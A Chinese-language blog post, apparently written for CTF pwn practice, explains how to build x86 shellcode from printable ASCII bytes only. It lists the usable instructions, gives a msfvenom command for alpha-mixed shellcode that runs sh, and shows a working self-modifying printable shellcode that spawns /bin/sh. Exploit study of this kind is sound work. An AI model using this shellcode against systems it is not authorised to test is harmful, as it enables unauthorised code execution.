---
layout:     post
title:      ascii shellcode
subtitle:   ascii shellcode
date:       2019-8-22
author:     枸杞蒲蒻
header-img: 
catalog: true
tags:
    - linux
    - pwn
---

# Ascii shellcode
一般一下指令在printable范围内
```
1.数据传送:
push/pop eax…
pusha/popa

2.算术运算:
inc/dec eax…
sub al, 立即数
sub byte ptr [eax… + 立即数], al dl…
sub byte ptr [eax… + 立即数], ah dh…
sub dword ptr [eax… + 立即数], esi edi
sub word ptr [eax… + 立即数], si di
sub al dl…, byte ptr [eax… + 立即数]
sub ah dh…, byte ptr [eax… + 立即数]
sub esi edi, dword ptr [eax… + 立即数]
sub si di, word ptr [eax… + 立即数]

3.逻辑运算:
and al, 立即数
and dword ptr [eax… + 立即数], esi edi
and word ptr [eax… + 立即数], si di
and ah dh…, byte ptr [ecx edx… + 立即数]
and esi edi, dword ptr [eax… + 立即数]
and si di, word ptr [eax… + 立即数]

xor al, 立即数
xor byte ptr [eax… + 立即数], al dl…
xor byte ptr [eax… + 立即数], ah dh…
xor dword ptr [eax… + 立即数], esi edi
xor word ptr [eax… + 立即数], si di
xor al dl…, byte ptr [eax… + 立即数]
xor ah dh…, byte ptr [eax… + 立即数]
xor esi edi, dword ptr [eax… + 立即数]
xor si di, word ptr [eax… + 立即数]

4.比较指令:
cmp al, 立即数
cmp byte ptr [eax… + 立即数], al dl…
cmp byte ptr [eax… + 立即数], ah dh…
cmp dword ptr [eax… + 立即数], esi edi
cmp word ptr [eax… + 立即数], si di
cmp al dl…, byte ptr [eax… + 立即数]
cmp ah dh…, byte ptr [eax… + 立即数]
cmp esi edi, dword ptr [eax… + 立即数]
cmp si di, word ptr [eax… + 立即数]

5.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

<=> jmp lable

6.交换al, ah
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.清零:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0
```
printable ascii [printable ascii](https://nets.ec/Ascii_shellcode#Introduction_to_Polymorphic_Ascii_Shellcode)
也可以用kali的msfvemon生成shellcode
```
msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -e x86/alpha_mixed BufferRegister=EDX -f python
```
如果都不能满足条件需要精心构造一段shellcode实现syscall和int 80h
```
jhh///sh/binT[RXh````Z(P5(P5(P4h>>>>Z(P4QZRX4@4KRZRZk@


    /* execve(path='/bin///sh', argv=0, envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
   /*rewrite shellcode to get 'int 80'*/
    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl
    /*set zero to edx*/
    push ecx
    pop edx
   /*set 0x0b to eax*/
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b
  /*foo order,for holding the  place*/
    push edx
    pop edx
    push edx
    pop edx

```
